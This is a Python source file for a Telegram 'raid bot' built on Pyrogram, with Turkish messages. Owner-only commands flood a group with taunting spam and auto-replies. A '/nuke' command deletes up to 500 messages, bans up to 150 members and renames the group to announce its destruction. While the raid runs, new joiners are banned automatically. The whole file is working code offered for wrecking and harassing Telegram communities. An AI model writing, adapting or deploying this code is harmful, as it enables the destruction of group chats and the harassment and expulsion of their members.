import os
import asyncio
import logging
import random
from pyrogram import Client, filters, enums
from pyrogram.types import ChatPrivileges
from pyrogram.errors import FloodWait, ChatAdminRequired
from dotenv import load_dotenv

load_dotenv()
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("RAID-MOD-2026-KARS")

app = Client(
    "raid_bot_westros",
    bot_token=os.getenv("BOT_TOKEN")
)

OWNER_ID = int(os.getenv("OWNER_ID"))
RAID_ACTIVE = {}  # chat_id: True/False raid durumu

def owner_only(func):
    async def wrapper(client, message):
        if message.from_user.id != OWNER_ID:
            return
        await func(client, message)
    return wrapper

# ───────────── RAID KOMUTLARI ──────────────

@app.on_message(filters.command("startraid") & filters.group)
@owner_only
async def start_raid(client, message):
    chat_id = message.chat.id
    RAID_ACTIVE[chat_id] = True
    await message.reply_text("**RAID MOD AKTİF – Westros FIRTINASI BAŞLIYOR** 🔥🖤")

    # Raid döngüsü (arka planda çalışsın)
    asyncio.create_task(raid_loop(client, chat_id))

@app.on_message(filters.command("stopraid") & filters.group)
@owner_only
async def stop_raid(client, message):
    chat_id = message.chat.id
    RAID_ACTIVE[chat_id] = False
    await message.reply_text("**RAID DURDURULDU – Fırtına bitti** ❄️")

async def raid_loop(client, chat_id):
    while RAID_ACTIVE.get(chat_id, False):
        try:
            # 1. Yeni mesajlara otomatik spam cevap
            @app.on_message(filters.chat(chat_id) & ~filters.me)
            async def auto_spam_reply(c, m):
                if not RAID_ACTIVE.get(chat_id, False): return
                try:
                    await m.reply("Westros RAID MODU AKTİF – KAÇAMAZSINIZ 🔥")
                    await asyncio.sleep(random.uniform(0.8, 2.0))
                except:
                    pass

            # 2. Sürekli random mesaj yağdır (flood modu)
            texts = ["westros’TAN SELAM", "RAID DEVAM", "HERKES SİKİLDİ", "westros 2026 🔥", "KAÇIN YOK"]
            await client.send_message(chat_id, random.choice(texts))
            await asyncio.sleep(random.uniform(1.5, 4.0))

        except FloodWait as e:
            await asyncio.sleep(e.value + 5)
        except Exception as e:
            logger.error(f"Raid loop hata: {e}")
            break

@app.on_message(filters.command("nuke") & filters.group)
@owner_only
async def nuke_with_raid(client, message):
    chat_id = message.chat.id
    await message.reply_text("**NUKE + RAID KOMBOSU – HER ŞEY YANACAK** ☢️")

    deleted = 0
    banned = 0

    try:
        async for msg in client.get_chat_history(chat_id, limit=500):
            try:
                await msg.delete()
                deleted += 1
                await asyncio.sleep(0.18)
            except:
                pass
    except:
        pass

    try:
        async for member in client.get_chat_members(chat_id, limit=150):
            if member.user.is_bot or member.user.id == OWNER_ID:
                continue
            try:
                await client.ban_chat_member(chat_id, member.user.id)
                banned += 1
                await asyncio.sleep(0.4)
            except ChatAdminRequired:
                await message.reply_text("Beni full admin yapmadan raid olmaz!")
                return
            except:
                pass
    except:
        pass

    try:
        await client.set_chat_title(chat_id, "Westros – YOK EDİLDİNİZ")
        await client.set_chat_description(chat_id, "Westros’in karanlık fırtınası – grup öldü 🖤")
    except:
        pass

    # Raid’i otomatik başlat
    RAID_ACTIVE[chat_id] = True
    asyncio.create_task(raid_loop(client, chat_id))

    await message.reply_text(f"**Nuke bitti + raid başladı!**\nSilinen: {deleted}\nBanlanan: {banned}")

@app.on_message(filters.new_chat_members)
async def auto_kick_newbies(client, message):
    chat_id = message.chat.id
    if not RAID_ACTIVE.get(chat_id, False):
        return
    for user in message.new_chat_members:
        if user.id == OWNER_ID:
            continue
        try:
            await client.ban_chat_member(chat_id, user.id)
            await client.send_message(chat_id, f"{user.first_name} giriş yaptı → anında banlandı 🔥")
        except:
            pass

@app.on_message(filters.command("start"))
async def start(client, message):
    await message.reply_text(
        "**Kars Raid Bot 2026 Aktif!**\n"
        "Sadece owner kullanır:\n"
        "/startraid → raid mod başlat\n"
        "/stopraid → raid durdur\n"
        "/nuke → nuke at + raid otomatik başlar\n"
        "Raid aktifken: yeni girenler banlanır, her mesaja cevap spam gelir"
    )

async def main():
    await app.start()
    me = await app.get_me()
    logger.info(f"RAID BOT HAZIR → @{me.username} | Kars 2026")
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
